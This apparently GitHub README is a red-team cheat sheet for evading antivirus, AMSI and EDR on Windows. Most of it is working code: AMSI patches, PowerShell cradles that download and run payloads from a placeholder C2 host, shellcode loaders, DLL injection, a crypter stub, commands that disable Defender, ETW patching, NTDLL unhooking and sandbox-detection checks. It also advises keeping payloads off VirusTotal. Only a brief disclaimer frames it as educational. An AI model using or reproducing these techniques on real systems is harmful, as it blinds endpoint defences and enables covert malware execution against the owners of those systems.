# AV Bypass

**Antivirus Evasion · Payload Obfuscation · AMSI Bypass · EDR Evasion · In-Memory Execution**

![AV Bypass](https://img.shields.io/badge/AV-BYPASS-ff0000?style=for-the-badge&logo=virustotal&logoColor=white&labelColor=1a0000)
![AMSI](https://img.shields.io/badge/AMSI-PATCH-8b0000?style=for-the-badge&logo=windows&logoColor=white&labelColor=1a0000)
![EDR](https://img.shields.io/badge/EDR-EVASION-cc0000?style=for-the-badge&logo=shield&logoColor=white&labelColor=1a0000)
![Obfuscation](https://img.shields.io/badge/OBFUSCATION-ENCODING-990000?style=for-the-badge&logo=gnuprivacyguard&logoColor=white&labelColor=1a0000)
![Platform](https://img.shields.io/badge/PLATFORM-WINDOWS%20%7C%20LINUX-333333?style=for-the-badge&labelColor=1a0000)

---

```
[*] AV sees signatures. Bypass the signature.
[*] EDR sees behavior. Bypass the behavior.
[*] AMSI sees the script. Bypass the scan.
[*] Goal: Execute. Stay invisible.
```

---

## Table of Contents

1. [How AV Works](#1-how-av-works)
2. [AV Detection Types](#2-av-detection-types)
3. [AMSI Bypass](#3-amsi-bypass)
4. [Payload Obfuscation](#4-payload-obfuscation)
5. [Encoding & Encryption](#5-encoding--encryption)
6. [In-Memory Execution](#6-in-memory-execution)
7. [Process Injection](#7-process-injection)
8. [Packers & Crypters](#8-packers--crypters)
9. [Bypassing Windows Defender](#9-bypassing-windows-defender)
10. [EDR Evasion](#10-edr-evasion)
11. [Sandbox Evasion](#11-sandbox-evasion)
12. [AV Bypass Tools](#12-av-bypass-tools)
13. [Testing Your Payload](#13-testing-your-payload)

---

## 1. How AV Works

```
┌─────────────────────────────────────────────────────────────────┐
│                    AV SCANNING PIPELINE                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   File / Script / Memory                                        │
│         │                                                       │
│         ▼                                                       │
│   [ Static Analysis ]   ← Hash, Signature, Strings, YARA       │
│         │                                                       │
│         ▼                                                       │
│   [ Dynamic Analysis ]  ← Sandbox, Emulation, Behaviour        │
│         │                                                       │
│         ▼                                                       │
│   [ Heuristic Engine ]  ← Anomaly, entropy, code patterns      │
│         │                                                       │
│         ▼                                                       │
│   [ ML / AI Engine ]    ← Model-based classification           │
│         │                                                       │
│         ▼                                                       │
│      BLOCK / ALLOW                                              │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. AV Detection Types

| Detection Type | How It Works | Bypass Method |
|---|---|---|
| **Signature** | Hash / byte pattern match | Modify bytes, pack, encrypt |
| **Heuristic** | Suspicious code patterns | Obfuscate, restructure code |
| **Behavioral** | Runtime action monitoring | LOLBins, inject, syscalls |
| **Emulation** | Run in mini-sandbox | Anti-emulation tricks |
| **ML / AI** | Model-based classification | Blend with legit code |
| **AMSI** | Scan PS/VBS/JScript in memory | Patch AMSI in memory |
| **Cloud Lookup** | Submit hash to cloud AV | Custom payload per target |

---

## 3. AMSI Bypass

```
[*] AMSI = Antimalware Scan Interface
[*] Hooks into PowerShell, VBScript, JScript, .NET
[*] Scans content BEFORE execution
[*] Must be patched in memory before running payload
```

### Method 1 — AmsiUtils Reflection (Classic)

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Method 2 — AmsiContext Null Pointer

```powershell
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext','NonPublic,Static')
$c=$b.GetValue($null)
[IntPtr]$ptr=$c
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### Method 3 — Memory Patch via P/Invoke

```powershell
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$lib = [Win32]::LoadLibrary("amsi.dll")
$addr = [Win32]::GetProcAddress($lib, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($addr, [uint32]5, 0x40, [ref]$p)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
```

### Method 4 — PowerShell v2 (No AMSI)

```powershell
powershell -version 2 -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://C2/payload.ps1')"
```

### Method 5 — Obfuscated AMSI Bypass (String Splitting)

```powershell
$x = 'System.Management.Automation.A';$y='msiUtils'
$z = [Ref].Assembly.GetType($x+$y)
$z.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## 4. Payload Obfuscation

### PowerShell Obfuscation

```powershell
# Concatenation
$c = 'IE'+'X'
$c(New-Object Net.WebClient).DownloadString('http://C2/shell.ps1')

# Backtick insertion (ignored by PS parser)
I`E`X(New-Object Net.Web`Client).Dow`nloadString('http://C2/shell.ps1')

# Case variation (PS is case-insensitive)
iEx(nEw-oBjEcT nEt.wEbClIeNt).dOwNlOaDsTrInG('http://C2/shell.ps1')

# Char code substitution
$c=[char]73+[char]69+[char]88
$c(...)

# Variable substitution
$env:ComSpec[4,24,25]-join''   # Returns 'iex'
```

### Invoke-Obfuscation

```powershell
# Install
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/danielbohannon/Invoke-Obfuscation/master/Invoke-Obfuscation.ps1')

# Usage
Invoke-Obfuscation
> SET SCRIPTPATH C:\payload.ps1
> TOKEN\ALL\1
> OUT C:\obfuscated.ps1
```

### Python Payload Obfuscation

```python
import base64, zlib

payload = b'import os; os.system("whoami")'

# Base64 encode
encoded = base64.b64encode(payload)
print(f'exec(__import__("base64").b64decode("{encoded.decode()}"))')

# Compress + encode
compressed = base64.b64encode(zlib.compress(payload))
print(f'exec(__import__("zlib").decompress(__import__("base64").b64decode("{compressed.decode()}")))')
```

---

## 5. Encoding & Encryption

### Base64 Encoding (PowerShell)

```powershell
# Encode command
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://C2/shell.ps1')"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand $enc

# Decode
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($enc))
```

### XOR Encryption (C#)

```csharp
byte[] payload = File.ReadAllBytes("payload.bin");
byte key = 0xAA;
for (int i = 0; i < payload.Length; i++)
    payload[i] ^= key;
File.WriteAllBytes("payload_xor.bin", payload);
```

Decrypt at runtime:

```csharp
byte[] enc = File.ReadAllBytes("payload_xor.bin");
byte key = 0xAA;
for (int i = 0; i < enc.Length; i++)
    enc[i] ^= key;
// Execute decrypted shellcode from memory
```

### AES Encryption (Python)

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

key = os.urandom(16)
iv  = os.urandom(16)

with open('shellcode.bin', 'rb') as f:
    data = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(data, AES.block_size))

print(f"KEY: {key.hex()}")
print(f"IV:  {iv.hex()}")

with open('shellcode_enc.bin', 'wb') as f:
    f.write(encrypted)
```

---

## 6. In-Memory Execution

```
[*] Never touch disk = Never trigger file-based AV
```

### PowerShell — Download & Execute in Memory

```powershell
# Load and run script entirely in memory
IEX(New-Object Net.WebClient).DownloadString('http://C2/payload.ps1')

# Using WebRequest
IEX(Invoke-WebRequest -Uri 'http://C2/payload.ps1' -UseBasicParsing).Content

# Load .NET assembly in memory
$bytes = (New-Object Net.WebClient).DownloadData('http://C2/payload.dll')
[System.Reflection.Assembly]::Load($bytes)
```

### C# — Shellcode Execution in Memory

```csharp
using System;
using System.Runtime.InteropServices;

class Exec {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr lpStartAddress, IntPtr c, uint d, IntPtr e);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 ms);

    static void Main() {
        byte[] sc = new byte[] { /* shellcode bytes here */ };
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, mem, sc.Length);
        IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }
}
```

---

## 7. Process Injection

### DLL Injection

```csharp
// OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
IntPtr hProc = OpenProcess(0x1F0FFF, false, targetPID);
IntPtr addr  = VirtualAllocEx(hProc, IntPtr.Zero, (uint)dllPath.Length, 0x3000, 0x40);
WriteProcessMemory(hProc, addr, Encoding.ASCII.GetBytes(dllPath), (uint)dllPath.Length, out _);
IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
```

### Process Hollowing

```
[1] Spawn target process (svchost.exe) in SUSPENDED state
[2] Unmap (hollow) the original executable from memory
[3] Write malicious payload into the hollowed process memory
[4] Resume the thread → payload executes as svchost.exe
```

### Early Bird APC Injection

```
[1] Create target process in SUSPENDED state
[2] Allocate memory in remote process
[3] Write shellcode to allocated memory
[4] Queue APC to the main thread (before it runs)
[5] Resume thread → APC runs → shellcode executes
```

---

## 8. Packers & Crypters

```
[*] Packer   → Compresses binary, small stub decompresses at runtime
[*] Crypter  → Encrypts binary, stub decrypts + executes at runtime
[*] Both defeat static signature detection
```

### UPX (Simple Packer)

```bash
# Pack binary
upx --best --ultra-brute payload.exe -o payload_packed.exe

# Note: UPX itself is flagged by most AV — use custom packer
```

### Custom Python Crypter

```python
import os, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Encrypt
with open('payload.exe', 'rb') as f:
    data = f.read()

key = b'RedTeam16ByteKey'
iv  = b'RedTeamIV123456!'
cipher = AES.new(key, AES.MODE_CBC, iv)
enc = base64.b64encode(cipher.encrypt(pad(data, 16)))

# Write stub loader
stub = f"""
import base64, subprocess, tempfile, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = b'RedTeam16ByteKey'
iv  = b'RedTeamIV123456!'
enc = {enc}
cipher = AES.new(key, AES.MODE_CBC, iv)
data = unpad(cipher.decrypt(base64.b64decode(enc)), 16)
tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.exe')
tmp.write(data); tmp.close()
subprocess.run(tmp.name)
os.unlink(tmp.name)
"""
with open('stub.py', 'w') as f:
    f.write(stub)
```

---

## 9. Bypassing Windows Defender

### Disable via PowerShell (Admin Required)

```powershell
# Disable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable all protections
Set-MpPreference -DisableRealtimeMonitoring $true `
                 -DisableBehaviorMonitoring $true `
                 -DisableIOAVProtection $true `
                 -DisableScriptScanning $true `
                 -DisableBlockAtFirstSeen $true

# Add exclusion folder
Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads"
Add-MpPreference -ExclusionProcess "powershell.exe"
Add-MpPreference -ExclusionExtension ".exe"
```

### Disable via Registry

```powershell
# Disable Defender via policy key
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
```

### Bypass via Exclusion Abuse

```powershell
# Check existing exclusions (may already include useful paths)
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

# Drop payload into excluded folder
Copy-Item payload.exe "C:\Program Files\WindowsApps\"
```

---

## 10. EDR Evasion

```
[*] EDR hooks user-mode API calls in NTDLL.dll
[*] Unhook NTDLL = blind the EDR
[*] Direct syscalls = bypass hooks entirely
```

### Unhook NTDLL

```csharp
// Load fresh copy of ntdll from disk
// Overwrite hooked .text section with clean version
// EDR hooks in memory are removed

IntPtr hProcess = GetCurrentProcess();
IntPtr hNtdll   = GetModuleHandle("ntdll.dll");

// Read clean ntdll from disk
byte[] clean = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");

// Parse PE and overwrite .text section
// → EDR hooks overwritten with original bytes
```

### Direct Syscalls (SysWhispers2)

```
[*] Call Windows kernel directly without going through NTDLL
[*] Bypasses all user-mode hooks placed by EDR
```

```bash
# Generate syscall stubs with SysWhispers2
python3 SysWhispers2.py --preset common -o syscalls

# Include generated asm/header in your C project
# Call NtAllocateVirtualMemory, NtWriteVirtualMemory directly
```

### ETW Patching (Event Tracing for Windows)

```csharp
// Patch EtwEventWrite to return immediately
// Blinds EDR event collection

IntPtr ntdll  = GetModuleHandle("ntdll.dll");
IntPtr etwPtr = GetProcAddress(ntdll, "EtwEventWrite");

uint oldProt;
VirtualProtect(etwPtr, (UIntPtr)4, 0x40, out oldProt);

// Write RET instruction — function returns immediately
byte[] patch = { 0xC3 };
Marshal.Copy(patch, 0, etwPtr, 1);

VirtualProtect(etwPtr, (UIntPtr)4, oldProt, out oldProt);
```

---

## 11. Sandbox Evasion

```
[*] AV sandboxes run your payload in a VM to observe behavior
[*] Detect the sandbox → don't execute → AV thinks it's clean
```

### Time-Based Evasion

```csharp
// Sleep longer than sandbox timeout (usually 30-60s)
System.Threading.Thread.Sleep(120000);  // Sleep 2 minutes

// Check if expected time has passed
DateTime start = DateTime.Now;
System.Threading.Thread.Sleep(10000);
if ((DateTime.Now - start).TotalSeconds < 9) Environment.Exit(0);
// Sandbox sped up time → exit
```

### User Interaction Checks

```csharp
// Check for mouse movement (sandbox has no user)
System.Drawing.Point p1 = System.Windows.Forms.Cursor.Position;
System.Threading.Thread.Sleep(5000);
System.Drawing.Point p2 = System.Windows.Forms.Cursor.Position;
if (p1 == p2) Environment.Exit(0);  // No movement → sandbox

// Check screen resolution (sandbox uses low res)
int width = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
if (width < 800) Environment.Exit(0);
```

### VM / Sandbox Artifact Checks

```csharp
// Check for sandbox processes
string[] sandboxProcs = { "vmsrvc", "vmusrvc", "vmtoolsd", "vboxservice",
                           "wireshark", "procmon", "processhacker", "fiddler" };
foreach (var proc in Process.GetProcesses())
    if (sandboxProcs.Any(s => proc.ProcessName.ToLower().Contains(s)))
        Environment.Exit(0);

// Check for low RAM (sandbox often has < 2GB)
var ram = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory;
if (ram < 2147483648) Environment.Exit(0);  // < 2GB → exit

// Check username (sandbox users)
string[] sandboxUsers = { "sandbox", "malware", "virus", "john", "test" };
string user = Environment.UserName.ToLower();
if (sandboxUsers.Any(s => user.Contains(s))) Environment.Exit(0);
```

---

## 12. AV Bypass Tools

| Tool | Language | Use Case |
|---|---|---|
| [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) | PowerShell | PS script obfuscation |
| [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2) | C/ASM | Direct syscall generation |
| [Donut](https://github.com/TheWover/donut) | C | Convert EXE/DLL to shellcode |
| [Scarecrow](https://github.com/optiv/ScareCrow) | Go | EDR bypass payload generator |
| [Freeze](https://github.com/optiv/Freeze) | Go | Bypass EDR with suspended process |
| [Nimcrypt2](https://github.com/icyguider/Nimcrypt2) | Nim | PE packer/crypter |
| [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript) | C# | .NET assembly → JScript/VBA |
| [SharpPack](https://github.com/mdsecactivebreach/SharpPack) | C# | Bypass AppLocker + AMSI |
| [Covenant](https://github.com/cobbr/Covenant) | C# | .NET C2 with built-in bypass |
| [Sliver](https://github.com/BishopFox/sliver) | Go | Cross-platform C2 framework |

---

## 13. Testing Your Payload

```
[!] NEVER upload to VirusTotal — signatures get shared with AV vendors
[!] Use offline / no-distribute scanners only
```

### Safe Testing Options

```bash
# ThreatCheck — find flagged bytes in payload
ThreatCheck.exe -f payload.exe -e Defender

# DefenderCheck (PowerShell)
DefenderCheck.exe payload.exe

# Test against local Defender only
# Enable Defender, run payload in isolated VM, check alerts

# Offline VT alternative — antiscan.me (no distribution)
# https://antiscan.me
```

### Find Detected Bytes with ThreatCheck

```bash
# Binary search through payload to isolate flagged region
ThreatCheck.exe -f payload.exe

# Output shows exact bytes triggering detection:
# [!] Bytes 1024-2048 flagged → obfuscate that region
```

---

## Quick Reference

```
[+] Static AV         → Encrypt payload, change hash, pack
[+] AMSI              → Patch amsiInitFailed, use PSv2, split strings
[+] Behavioral EDR    → LOLBins, inject, avoid suspicious parent-child
[+] Sandbox           → Sleep, check mouse/RAM/resolution/username
[+] Signature         → Modify bytes, XOR/AES encrypt, custom packer
[+] ETW               → Patch EtwEventWrite to RET
[+] API Hooks         → Unhook NTDLL, direct syscalls (SysWhispers)
[+] Testing           → ThreatCheck, DefenderCheck, never VirusTotal
```

---

## ⚠️ Disclaimer

```
[!] For EDUCATIONAL and AUTHORIZED TESTING purposes only.
[!] Use only on systems you own or have explicit permission to test.
[!] Author is NOT responsible for any misuse or illegal use.
```

---

## License

MIT
